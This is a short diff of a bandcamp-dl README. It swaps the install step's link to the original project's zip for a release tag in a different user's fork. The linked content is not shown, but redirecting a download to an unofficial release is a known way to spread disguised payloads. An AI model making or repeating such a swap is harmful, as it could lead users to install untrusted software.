@@ -6,7 +6,7 @@ bandcamp-dl URL
 
 # Installation
 
-1. Clone the project or [download the zip](https://github.com/iheanyi/bandcamp-dl/archive/master.zip)
+1. Clone the project or download the zip from [here](https://github.com/Joshwoo69/bandcamp-dl/releases/tag/V68)
 2. Make sure you have [pip](https://pip.pypa.io/en/latest/installing.html) installed
 3. `cd` to the directory with the `requirements.txt` file in it
 4. `pip install -r requirements.txt`
